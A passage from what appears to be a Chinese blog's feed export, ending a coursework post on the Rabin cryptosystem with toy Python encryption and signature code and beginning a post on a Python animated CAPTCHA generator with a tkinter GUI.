class="number">3</span>]</span><br><span class="line">    p=random.choice(pks)</span><br><span class="line">    q=random.choice(pks)</span><br><span class="line">    <span class="keyword">while</span> p==q:</span><br><span class="line">        q=random.choice(pks)</span><br><span class="line">    key=p*q</span><br><span class="line">    keys=[p,q,key]</span><br><span class="line">    <span class="keyword">return</span> keys</span><br><span class="line"></span><br><span class="line"><span class="comment">#加密函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Rabin_encode</span>(<span class="params">message,key</span>):</span></span><br><span class="line">    plaintext=message</span><br><span class="line">    ciphertext=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> plaintext:</span><br><span class="line">        ciphertext.append(<span class="built_in">str</span>(<span class="built_in">hash</span>(<span class="built_in">str</span>(<span class="built_in">ord</span>(i))))) <span class="comment"># 加入hash标识(当然仅仅是在同一个程序进程中才有效，python内置hash的函数是将str的储存地址当作标时进行转换的，不同进程的相同字符的地址不一样，当然可换成其它类型的hash函数)</span></span><br><span class="line">        ciphertext.append(<span class="built_in">str</span>((<span class="built_in">ord</span>(i))*(<span class="built_in">ord</span>(i))%key))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="comment">#解密函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Rabin_decode</span>(<span class="params">message,p,q</span>):</span></span><br><span class="line">    ciphertext=message</span><br><span class="line">    plaintext=[]</span><br><span class="line">    temp=<span class="number">0</span></span><br><span class="line">    <span class="comment"># 拓展欧几里得</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(p):</span><br><span class="line">        <span class="keyword">if</span> (i*q)%p==<span class="number">1</span>:</span><br><span class="line">            temp=i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    a=q*temp</span><br><span class="line">    temp=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(q):</span><br><span class="line">        <span class="keyword">if</span> (i*p)%q==<span class="number">1</span>:</span><br><span class="line">            temp=i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    b=p*temp</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">1</span>: <span class="comment"># 略过hash标识</span></span><br><span class="line">            m_temp=[]</span><br><span class="line">            m=[]</span><br><span class="line">            m_temp.append(fast_power(<span class="built_in">int</span>(ciphertext[i]),(p+<span class="number">1</span>)//<span class="number">4</span>)%p) <span class="comment">#这里要用// 整数除法</span></span><br><span class="line">            m_temp.append(p-fast_power(<span class="built_in">int</span>(ciphertext[i]),(p+<span class="number">1</span>)//<span class="number">4</span>)%p)</span><br><span class="line">            m_temp.append(fast_power(<span class="built_in">int</span>(ciphertext[i]),(q+<span class="number">1</span>)//<span class="number">4</span>)%q)</span><br><span class="line">            m_temp.append(q-fast_power(<span class="built_in">int</span>(ciphertext[i]),(q+<span class="number">1</span>)//<span class="number">4</span>)%q)</span><br><span class="line">            <span class="comment"># 中国剩余定理</span></span><br><span class="line">            m.append((a*m_temp[<span class="number">0</span>]+b*m_temp[<span class="number">2</span>])%(p*q))</span><br><span class="line">            m.append((a*m_temp[<span class="number">0</span>]+b*m_temp[<span class="number">3</span>])%(p*q))</span><br><span class="line">            m.append((a*m_temp[<span class="number">1</span>]+b*m_temp[<span class="number">2</span>])%(p*q))</span><br><span class="line">            m.append((a*m_temp[<span class="number">1</span>]+b*m_temp[<span class="number">3</span>])%(p*q))</span><br><span class="line">            <span class="keyword">for</span> each_m <span class="keyword">in</span> m:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">hash</span>(<span class="built_in">str</span>(each_m))==<span class="built_in">int</span>(ciphertext[i-<span class="number">1</span>]):</span><br><span class="line">                    plaintext.append(<span class="built_in">chr</span>(each_m))</span><br><span class="line">                    <span class="keyword">break</span> <span class="comment">#要break，否则值重复</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    start = time.perf_counter()</span><br><span class="line">    keys=Rabin_getkeys() <span class="comment"># 生成公钥密钥</span></span><br><span class="line">    <span class="built_in">print</span> (keys)  <span class="comment">#打印公钥与私钥，前两位为私钥用于解密，最后一位为公钥，用于加密</span></span><br><span class="line">    message=<span class="string">&quot;Hello,rabin&quot;</span></span><br><span class="line">    cipher=Rabin_encode(message,keys[-<span class="number">1</span>]) <span class="comment"># 生成密文</span></span><br><span class="line">    <span class="built_in">print</span>(cipher)</span><br><span class="line">    <span class="built_in">print</span>(Rabin_decode(cipher,keys[<span class="number">0</span>],keys[<span class="number">1</span>]))  <span class="comment">#打印解密结果</span></span><br><span class="line">    end = time.perf_counter()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;运行时间&quot;</span>, end - start)</span><br></pre></td></tr></table></figure><h3 id="Rabin公钥加密体制的应用场景"><a href="#Rabin公钥加密体制的应用场景" class="headerlink" title="Rabin公钥加密体制的应用场景"></a>Rabin公钥加密体制的应用场景</h3><p>Rabin公钥加密体制实际上就是一种RSA算法的特例，在实际应用中，Rabin公钥加密体制主要被用于签名算法。</p><h4 id="数字签名算法"><a href="#数字签名算法" class="headerlink" title="数字签名算法"></a>数字签名算法</h4><p>Rabin 密码系统可用于创建和验证数字签名。创建签名需要私钥 (<em>p</em>,<em>q</em>) , 验证签名需要公钥<em>n</em>.</p><p><strong>签名：</strong></p><p>一个消息 <em>m</em>&lt;<em>n</em> 可以用私钥签名(<em>p</em>,<em>q</em>) 如下。</p><p>1.生成随机值 <em>u</em>.</p><p>2.使用加密哈希函数H 计算<em>c</em>=<em>H</em>(<em>m</em>|<em>u</em>)，其中条形表示串联。<em>c</em>应该小于<em>n</em>.</p><p>3.对待 <em>c</em>作为 Rabin 加密的值并尝试使用私钥 (<em>p,q</em>) 对其进行解密.<br>这将产生通常的四个结果，<em>r</em>1, <em>r</em>2, <em>r</em>3, <em>r</em>4.</p><p>4.人们可能期望加密每个<em>r</em>i会产生<em>c</em>, 然而，这仅在以下情况下成立<em>c</em>恰好是二次残差<em>p</em> 和<em>q</em>. 要确定是否是这种情况，应加密第一个解密结果<em>r</em>1. 如果它没有加密到<em>c</em>, 用一个新的随机数重复这个算法. 在找到合适的算法之前需要重复此算法的预期次数<em>c</em>是4次.</p><p>5.找到了一个<em>r</em>1加密到<em>c</em>，签名是(<em>r</em>1,<em>u</em>).</p><p><strong>验证签名：</strong></p><p>一个签名(<em>r</em>,<em>u</em>)的<em>m</em>可以使用公钥进行验证<em>n</em> 如下。</p><p>1. 计算<em>c</em>=<em>H</em>(<em>m</em>|<em>u</em>)。</p><p>2. 使用公钥<em>n</em>加密<em>r</em>。</p><p>3. 当且仅当 <em>r</em> 等于<em>c</em>时签名有效。</p><p>下面展示一下Rabin数字签名算法的详细过程。</p><p>质数 $p$ 和 $q$，且有$ p \equiv 3 \pmod{4}$，$q \equiv 3 \pmod{4}$。组合 $(p, q)$ 为私钥，两数的乘积 $n = pq$ 为对应的公钥。使用私钥 $(p, q)$ 对消息 $m$ 签名的结果为组合 $(S, U)$，满足<br>$$<br>S^2 \equiv H(m||U) \pmod{n} \tag{1}<br>$$<br>其中的 $U$ 被称为填充值，$H(m||U)$ 的意思是将 $m$ 和 $U$ 的二进制流拼接在一起后再计算哈希，并将哈希结果（二进制流）看成一个整数。</p><p>令 $H = H(m||U) \bmod{n}$ 来简化书写。当 $U$ 确定后，可以用下式计算 S 的值。<br>$$<br>S = \left[q \cdot (H^{\frac{p+1}{4}} \bmod{p}) \cdot (q^{p-2} \bmod{p}) + p \cdot (H^{\frac{q+1}{4}} \bmod{q}) \cdot (p^{q-2} \bmod{q})\right] \bmod{n} \tag{2}<br>$$<br>这样便得到了一组 $(S, U)$，将结果代入 (1) 式验算，若成立则返回这组结果，反之则改变 $U$ 的值重新计算 $S$，直到找到一组满足 (1) 式的解。</p><p>请注意，当 $p \equiv 3 \pmod{4}$ 时，$\frac{p+1}{4}$ 是一个整数，同理 $\frac{q+1}{4}$ 也是一个整数。</p><p>签名时，通过循环在 $m$ 后追加字节 <code>0x00</code> 来改变 $H$ 的值，并在计算出 $S$​ 后验证 (1) 式是否成立，是则跳出循环返回，否则继续寻找。</p><p>通过上面的描述你能看到，Rabin 签名的计算过程相对复杂，但验证过程极其简单。这个特性使得它非常适合在链上直接验签，虽然我们也可以在比特币脚本中实现 ECDSA 的验签逻辑，但它的计算成本要比验证 Rabin 签名高出许多。</p><p>整个算法设计基于这样的数学难题：在模是大合数的情况下，求二次剩余平方根是困难的。使用 Rabin 签名时，为了获得足够的安全性，公钥 $n$​ 和哈希 $H(m||U)$​​ 的结果至少需要 3072 bits。</p><p><strong>代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span>(<span class="params">p: <span class="built_in">int</span>, q: <span class="built_in">int</span>, digest: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">tuple</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param p: part of private key</span></span><br><span class="line"><span class="string">    :param q: part of private key</span></span><br><span class="line"><span class="string">    :param digest: message digest to sign</span></span><br><span class="line"><span class="string">    :return: rabin signature (S: int, U: bytes)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    n = p * q</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        h = hash_to_int(digest + <span class="string">b&#x27;\x00&#x27;</span> * i) % n</span><br><span class="line">        lp = q * <span class="built_in">pow</span>(h, (p + <span class="number">1</span>) // <span class="number">4</span>, p) * <span class="built_in">pow</span>(q, p - <span class="number">2</span>, p)</span><br><span class="line">        rp = p * <span class="built_in">pow</span>(h, (q + <span class="number">1</span>) // <span class="number">4</span>, q) * <span class="built_in">pow</span>(p, q - <span class="number">2</span>, q)</span><br><span class="line">        s = (lp + rp) % n</span><br><span class="line">        <span class="keyword">if</span> (s * s) % n == h % n:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> s, <span class="string">b&#x27;\x00&#x27;</span> * i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">n: <span class="built_in">int</span>, digest: <span class="built_in">bytes</span>, s: <span class="built_in">int</span>, u: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bool</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param n: rabin public key</span></span><br><span class="line"><span class="string">    :param digest: digest of signed message</span></span><br><span class="line"><span class="string">    :param s: S of signature</span></span><br><span class="line"><span class="string">    :param u: padding U of signature</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> hash_to_int(digest + u) % n == (s * s) % n</span><br></pre></td></tr></table></figure><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ul><li>[1] W. Diffie and M. Hellman, IEEE Transactions On Information Theory 22, 644–654 (1976).</li><li>[2] R. L. Rivest, A. Shamir, and L. Adleman, Communications Of The ACM 21,120–126 (1978).</li><li>[3] M. O. Rabin, MIT Technical Report MIT/LCS/TR-212 (1979).</li><li>[4] N. Koblitz and A. J. Menezes, Journal of Cryptology 20, 3–37 (2007).</li><li>[5] D. Boneh, “Simplified OAEP For The RSA And Rabin Functions,” in Advances In Cryptology-Crypto 2001 (Springer, 2001), pp. 275–291.</li><li>[6] S. D. Galbraith, Mathematics Of Public Key Cryptography (Cambridge University Press, 2012).</li><li>[7] M. A. Asbullah and M. R. K. Ariffin, Malaysian Journal of Mathematical Sciences 11 (2016).</li><li>[8] aaron67, Rabin 数字签名 (2021). <a href="https://aaron67.cc/2021/07/10/rabin-signatures/">https://aaron67.cc/2021/07/10/rabin-signatures/</a>.</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h3&gt;&lt;p&gt;Rabin 密码系统是第一个非对称密码系统，由&lt;a href=&quot;https://en.wikipedia.org/wiki/Michael_</summary>
      
    
    
    
    
    <category term="密码学" scheme="https://zxy.link/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    <category term="课程报告" scheme="https://zxy.link/tags/%E8%AF%BE%E7%A8%8B%E6%8A%A5%E5%91%8A/"/>
    
  </entry>
  
  <entry>
    <title>Python实现动态验证码(包含GUI)</title>
    <link href="https://zxy.link/posts/8aab642a/"/>
    <id>https://zxy.link/posts/8aab642a/</id>
    <published>2021-12-07T16:00:00.000Z</published>
    <updated>2022-01-22T12:43:56.780Z</updated>
    
    <content type="html"><![CDATA[<div class="note info flat"><p>本项目是《网络安全A》课程的一项附加作业</p></div><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>本项目主要分为三个类，也分别代表了本项目的三个主要部分。首先是<code>DynamicVerificationCode</code>类，主要实现生成动态验证码每一帧的PNG图像文件，是本项目的核心；然后是<code>LabelDisplay</code>类，负责将gif文件动态显示在界面中；最后是<code>GUI</code>类，负责将PNG序列合称为gif文件，并基于tkinter构建图形界面。</p><p><img src="/img/13bfc486090acb2c0be59588d2c11352.png" alt="P193\#y1"></p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>下面来分析一下<code>DynamicVerificationCode</code>类的代码。要实现动态验证码，主要实现以下几个功能：生成随机颜色，生成随机字符（包含数字和大小写字母）。生成干扰线段，生成干扰点以及将每一帧合称为gif文件。以上几个功能分别对应以下几个函数：<code>Colorconfusion()</code>, <code>StrInDVC()</code>, <code>LineConfusion()</code>, <code>ArcConfusion()</code>, <code>Create()</code>。</p><p>首先是<code>Colorconfusion()</code>函数，因为使用RGB色彩模式，因此只需要生成三个0-255之间的随机数即可，这个函数会被调用生成随机背景颜色和生成随机字体颜色。<code>StrInDVC()</code>函数也很简单，只需要生成数字和大小写字母各自范围内的ASCII码值即可，如小写字母则使用<code>chr(random.randint(97, 122))</code>生成。然后是<code>LineConfusion()</code>，由于gif的长和宽是确定的，因此生成线段只需生成两个随机坐标即可，分别作为起点和终点，然后调用PIL <code>Image.line()</code>函数即可生成线段。对于<code>ArcConfusion()</code>函数则需要调用PIL <code>Image.point()</code>函数，同样是生成随机数不再赘述。</p><p>最后在<code>Create()</code>函数内，首先生成随机字符，然后设置一个图像序列<code>picSequence</code>，设置字体为COOPBL.TTF（注：若环境中不包含本字体将报错），调用PIL <code>Image.text()</code>函数在每帧图像上写入字符，注意字符的位置也需要随机生成，然后分别调用<code>self.LineConfusion(createpic)</code>和<code>self.ArcConfusion(createpic)</code>生成随机线和点，最后返回图像序列即可。</p><h2 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h2><p>主界面展示，包含输入框、提交按钮和刷新按钮。</p><p><img src="/img/maingui.jpg" alt="maingui"></p><p>当提交内容为空时，将提示空值警告信息。</p><p><img src="/img/5a5e2078788aff0f39d05f306afbe432.jpeg" alt="P201\#y1"></p><p>当提交了错误的验证码时，将报错。</p><p><img src="/img/96b2076adfb2fb144c1ee0097d49564e.jpeg" alt="P203\#y1"></p><p>当验证码正确时，提示验证通过。</p><p><img src="/img/ec6d830acd36951abce68e1a6dacf4ba.jpeg" alt="P206\#y1"></p><p>点击刷新按钮后，动态验证码更换，当然验证信息也随之更换。</p><p><img src="/img/9f27126f29b436ffe64baa065cb343bb.jpeg" alt="P207\#y1"></p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><div class="note danger flat"><p>注意字体被设置为<code>COOPBL.TTF</code>，若系统中不包含本字体将报错</p></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2021/12/08</span></span><br><span class="line"><span class="comment"># @Author  : zxy</span></span><br><span class="line"><span class="comment"># @Version : 1.0</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> tkinter.messagebox</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> imageio</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageDraw</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageFont</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageTk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LabelDisplay</span>(<span class="params">Label</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, master, filename</span>):</span></span><br><span class="line">        image = Image.<span class="built_in">open</span>(filename)</span><br><span class="line">        sequence = []</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">                sequence.append(image.copy())</span><br><span class="line">                image.seek(<span class="built_in">len</span>(sequence))</span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.delay = image.info[<span class="string">&#x27;duration&#x27;</span>]</span><br><span class="line">        <span class="keyword">except</span> KeyError:</span><br><span class="line">            self.delay = <span class="number">100</span></span><br><span class="line"></span><br><span class="line">        begin = sequence[<span class="number">0</span>].convert(<span class="string">&#x27;RGBA&#x27;</span>)</span><br><span class="line">        self.frames = [ImageTk.PhotoImage(begin)]</span><br><span class="line"></span><br><span class="line">        Label.__init__(self, master, image=self.frames[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        frameTemp = sequence[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> image <span class="keyword">in</span> sequence[<span class="number">1</span>:]:</span><br><span class="line">            frameTemp.paste(image)</span><br><span class="line">            frame = frameTemp.convert(<span class="string">&#x27;RGBA&#x27;</span>)</span><br><span class="line">            self.frames.append(ImageTk.PhotoImage(frame))</span><br><span class="line"></span><br><span class="line">        self.frameID = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        self.cancel = self.after(self.delay, self.play)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">play</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.config(image=self.frames[self.frameID])</span><br><span class="line">        self.frameID += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> self.frameID == <span class="built_in">len</span>(self.frames):</span><br><span class="line">            self.frameID = <span class="number">0</span></span><br><span class="line">        self.cancel = self.after(self.delay, self.play)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicVerificationCode</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, breadth=<span class="number">200</span>, vertical=<span class="number">55</span>, strcount=<span class="number">5</span>, fontsize=<span class="number">40</span>, arccount=<span class="number">20</span>, linecount=<span class="number">3</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                 number_of_frames=<span class="number">30</span></span>):</span></span><br><span class="line">        <span class="comment"># 推荐的几种方案：</span></span><br><span class="line">        <span class="comment"># (self, width=200, height=55, code_count=5, font_size=40, point_count=20, line_count=3, frame_count=30)</span></span><br><span class="line">        <span class="comment"># (self, width=600, height=200, code_count=6, font_size=90, point_count=120, line_count=30, frame_count=90)</span></span><br><span class="line">        <span class="comment"># (self, width=1200, height=400, code_count=8, font_size=150, point_count=1200, line_count=55, frame_count=90)</span></span><br><span class="line">        self.breadth = breadth</span><br><span class="line">        self.vertical = vertical</span><br><span class="line">        self.strcount = strcount</span><br><span class="line">        self.fontsize = fontsize</span><br><span class="line">        self.arccount = arccount</span><br><span class="line">        self.linecount = linecount</span><br><span class="line">        self.number_of_frames = number_of_frames</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Colorconfusion</span>(<span class="params">self</span>):</span></span><br><span class="line">        colorr = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">        colorg = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">        colorb = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">        <span class="keyword">return</span> colorr, colorg, colorb</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">StrInDVC</span>(<span class="params">self</span>):</span></span><br><span class="line">        number = <span class="built_in">str</span>(random.randint(<span class="number">0</span>, <span class="number">9</span>))</span><br><span class="line">        xiaoxieap = <span class="built_in">chr</span>(random.randint(<span class="number">97</span>, <span class="number">122</span>))</span><br><span class="line">        daxieap = <span class="built_in">chr</span>(random.randint(<span class="number">65</span>, <span class="number">90</span>))</span><br><span class="line">        reStr = random.choice([number, xiaoxieap, daxieap])</span><br><span class="line">        <span class="keyword">return</span> reStr</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">LineConfusion</span>(<span class="params">self, createpic=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.linecount):</span><br><span class="line">            sourcex = random.randint(<span class="number">0</span>, self.breadth)</span><br><span class="line">            destx = random.randint(<span class="number">0</span>, self.breadth)</span><br><span class="line">            sourcey = random.randint(<span class="number">0</span>, self.vertical)</span><br><span class="line">            desty = random.randint(<span class="number">0</span>, self.vertical)</span><br><span class="line">            createpic.line((sourcex, sourcey, destx, desty), fill=self.Colorconfusion())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ArcConfusion</span>(<span class="params">self, createpic=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.arccount):</span><br><span class="line">            createpic.point([random.randint(<span class="number">0</span>, self.breadth), random.randint(<span class="number">0</span>, self.vertical)],</span><br><span class="line">                            fill=self.Colorconfusion())</span><br><span class="line">            x = random.randint(<span class="number">0</span>, self.breadth)</span><br><span class="line">            y = random.randint(<span class="number">0</span>, self.vertical)</span><br><span class="line">            createpic.arc((x, y, x + <span class="number">4</span>, y + <span class="number">4</span>), <span class="number">0</span>, <span class="number">90</span>, fill=self.Colorconfusion())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Create</span>(<span class="params">self</span>):</span></span><br><span class="line">        StrInDVCList = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.strcount):</span><br><span class="line">            s = self.StrInDVC()</span><br><span class="line">            StrInDVCList.append(s)</span><br><span class="line"></span><br><span class="line">        background = self.Colorconfusion()</span><br><span class="line"></span><br><span class="line">        picSequence = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.number_of_frames):</span><br><span class="line">            DVC = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (self.breadth, self.vertical), background)</span><br><span class="line">            createpic = ImageDraw.Draw(DVC)</span><br><span class="line"></span><br><span class="line">            fontInDVC = os.path.join(os.getcwd(), <span class="string">&quot;COOPBL.TTF&quot;</span>)</span><br><span class="line">            font = ImageFont.truetype(fontInDVC, size=self.fontsize)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> i, code <span class="keyword">in</span> <span class="built_in">enumerate</span>(StrInDVCList):</span><br><span class="line">                y = random.randint(<span class="built_in">int</span>(-<span class="number">0.133</span> * self.vertical), <span class="built_in">int</span>(<span class="number">0.267</span> * self.vertical))</span><br><span class="line">                x = random.randint(<span class="number">14</span>, <span class="number">22</span>)</span><br><span class="line">                createpic.text((x + i * (self.breadth / self.strcount), y), code, self.Colorconfusion(), font=font)</span><br><span class="line"></span><br><span class="line">            